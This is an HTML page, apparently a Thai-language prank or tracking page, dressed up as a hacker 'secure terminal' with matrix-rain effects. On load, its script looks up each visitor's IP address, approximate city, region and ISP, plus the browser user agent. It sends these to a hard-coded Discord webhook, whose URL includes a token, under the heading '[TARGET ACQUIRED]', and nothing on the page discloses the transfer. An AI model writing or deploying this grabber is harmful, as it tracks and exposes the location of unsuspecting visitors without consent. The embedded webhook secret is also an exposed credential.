<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>CYBER_SEC // ROOT ACCESS</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; background: #000; overflow: hidden; font-family: 'Share Tech Mono', monospace; }
    canvas { position: fixed; inset: 0; opacity: 0.3; pointer-events: none; }
    
    .scanline {
      position: fixed; inset: 0; pointer-events: none; z-index: 5;
      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
      background-size: 100% 4px, 6px 100%;
    }

    .wrap {
      position: relative; z-index: 10; height: 100%;
      display: flex; align-items: center; justify-content: center; padding: 16px;
    }
    
    .term {
      width: 100%; max-width: 620px; background: rgba(3, 10, 3, 0.94);
      border: 1px solid #00ff66; border-radius: 6px;
      box-shadow: 0 0 35px rgba(0, 255, 102, 0.3), inset 0 0 20px rgba(0, 255, 102, 0.15);
      color: #00ff66;
    }

    .bar {
      padding: 10px 14px; background: rgba(0, 255, 102, 0.1);
      border-bottom: 1px solid #00ff66; font-size: 0.85rem;
      display: flex; justify-content: space-between; align-items: center;
      letter-spacing: 1px;
    }
    
    .title { color: #00ff66; font-weight: bold; display: flex; align-items: center; gap: 8px; }
    .dot-group { display: flex; gap: 6px; }
    .dot { width: 8px; height: 8px; background: #00ff66; box-shadow: 0 0 8px #00ff66; border-radius: 50%; }

    #out { 
      padding: 20px; min-height: 260px; max-height: 380px; overflow-y: auto;
      font-size: 1rem; line-height: 1.6; white-space: pre-wrap; word-break: break-word;
      text-shadow: 0 0 6px rgba(0, 255, 102, 0.5);
    }

    .cursor { 
      display: inline-block; width: 10px; height: 1.1em; background: #00ff66; 
      vertical-align: middle; animation: blink 0.8s steps(1) infinite; 
      box-shadow: 0 0 10px #00ff66;
    }
    
    @keyframes blink { 50% { opacity: 0; } }

    .note { 
      padding: 10px 20px; font-size: 0.75rem; color: #00ff66; opacity: 0.8; 
      border-top: 1px dashed rgba(0, 255, 102, 0.4); background: rgba(0,0,0,0.4);
      display: flex; justify-content: space-between;
    }
    
    .blink-text { animation: warning 1.2s infinite; color: #ff003c; text-shadow: 0 0 6px #ff003c; }
    @keyframes warning { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
  </style>
</head>
<body>
  <div class="scanline"></div>
  <canvas id="matrix"></canvas>
  
  <div class="wrap">
    <div class="term">
      <div class="bar">
        <span class="title">⚡ SECURE_TERMINAL // v4.0.2</span>
        <div class="dot-group">
          <div class="dot"></div>
          <div class="dot"></div>
          <div class="dot"></div>
        </div>
      </div>
      <div id="out"></div>
      <div class="note">
        <span>// CONNECTION ENCRYPTED</span>
        <span class="blink-text">STATUS: ACTIVE</span>
      </div>
    </div>
  </div>

  <script>
    // ---------- Matrix Rain Effect ----------
    const canvas = document.getElementById("matrix"), ctx = canvas.getContext("2d");
    let cols, drops;
    function initMatrix() {
      canvas.width = innerWidth; canvas.height = innerHeight;
      cols = Math.floor(canvas.width / 18);
      drops = Array(cols).fill(1);
    }
    initMatrix(); window.addEventListener("resize", initMatrix);
    const chars = "01ABCDEFXYZ<>[]{}#*&@$+-~アイウエオカキ";
    setInterval(() => {
      ctx.fillStyle = "rgba(0,0,0,0.08)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#00ff66";
      ctx.font = "15px 'Share Tech Mono', monospace";
      drops.forEach((y, i) => {
        ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 18, y * 18);
        if (y * 18 > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      });
    }, 45);

    // ---------- Terminal Typing ----------
    const out = document.getElementById("out");
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    async function type(text, speed = 22) {
      for (const ch of text) { out.textContent += ch; await sleep(speed); }
    }
    function cursor(on) {
      let el = out.querySelector(".cursor");
      if (on && !el) { el = document.createElement("span"); el.className = "cursor"; out.appendChild(el); }
      if (!on && el) el.remove();
    }

    // ---------- Country Translation ----------
    const countryMap = {
      "Thailand": "ประเทศไทย", "United States": "สหรัฐอเมริกา", "Japan": "ญี่ปุ่น",
      "United Kingdom": "สหราชอาณาจักร", "China": "จีน", "Singapore": "สิงคโปร์",
      "South Korea": "เกาหลีใต้", "Germany": "เยอรมนี", "France": "ฝรั่งเศส",
      "Taiwan": "ไต้หวัน", "Hong Kong": "ฮ่องกง", "Laos": "ลาว", "Malaysia": "มาเลเซีย"
    };

    // ---------- IP Grabber & Discord Webhook ----------
    const WEBHOOK = "https://discord.com/api/webhooks/1566010672658120764/Ixquirn6vSXk9nQwam2tkyhQ7fvW3jm7sWkrJVKau3XtZ44CbeB7S8s933cC6ZoMTcOn";

    async function getInfo() {
      const apis = [
        "https://ipwho.is/",
        "https://ipapi.co/json/",
        "https://api.ipify.org?format=json"
      ];

      let info = { ip: "UNKNOWN", loc: "ไม่สามารถระบุได้", isp: "ไม่ทราบ", type: "" };

      for (const api of apis) {
        try {
          const res = await fetch(api);
          const data = await res.json();
          if (api.includes("ipwho.is") && data.success) {
            info.ip = data.ip;
            const country = countryMap[data.country] || data.country || "";
            info.loc = [data.city, data.region, country].filter(Boolean).join(", ") || "ไม่ทราบ";
            info.isp = (data.connection && data.connection.isp) || "ไม่ทราบ";
            info.type = data.type || "";
            break;
          } else if (api.includes("ipapi.co") && data.ip) {
            info.ip = data.ip;
            const country = countryMap[data.country_name] || data.country_name || "";
            info.loc = [data.city, data.region, country].filter(Boolean).join(", ") || "ไม่ทราบ";
            info.isp = data.org || "ไม่ทราบ";
            info.type = data.version || "";
            break;
          } else if (api.includes("ipify.org") && data.ip) {
            info.ip = data.ip;
            break;
          }
        } catch (e) { continue; }
      }
      return info;
    }

    async function notify(info) {
      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [{
              title: "🚨 [TARGET ACQUIRED] มีผู้เข้าชมเว็บไซต์",
              color: 0x00ff66,
              fields: [
                { name: "🌐 IP Address", value: "`" + info.ip + "`", inline: true },
                { name: "🕒 เวลาเข้าถึง", value: new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" }), inline: true },
                { name: "📍 ตำแหน่งโดยประมาณ", value: info.loc },
                { name: "📡 ผู้ให้บริการเครือข่าย", value: info.isp },
                { name: "💻 ข้อมูลอุปกรณ์", value: navigator.userAgent.slice(0, 200) }
              ],
              footer: { text: "SECURITY LOG // SYSTEM BYPASS" }
            }]
          })
        });
      } catch (e) {}
    }

    // ---------- Execution Process ----------
    (async () => {
      const infoPromise = getInfo();
      await type("[*] INITIALIZING SYSTEM PROTOCOLS...\n");
      await sleep(250);
      await type("[*] ESTABLISHING SECURE HANDSHAKE...\n");
      await sleep(300);
      await type("[+] CONNECTION ESTABLISHED [OK]\n");
      await sleep(200);
      
      const info = await infoPromise;
      await type("[+] VISITOR IP IDENTIFIED : " + info.ip + "\n");
      if (info && info.loc !== "ไม่สามารถระบุได้") {
        await type("[+] APPROX. LOCATION    : " + info.loc + "\n");
      }
      await type("[*] LOGGING ACCESS METRICS...\n");
      await sleep(300);
      await type("\n> ACCESS GRANTED. WELCOME, OPERATOR_\n");
      
      cursor(true);
      if (info) notify(info);
    })();
  </script>
</body>
</html>
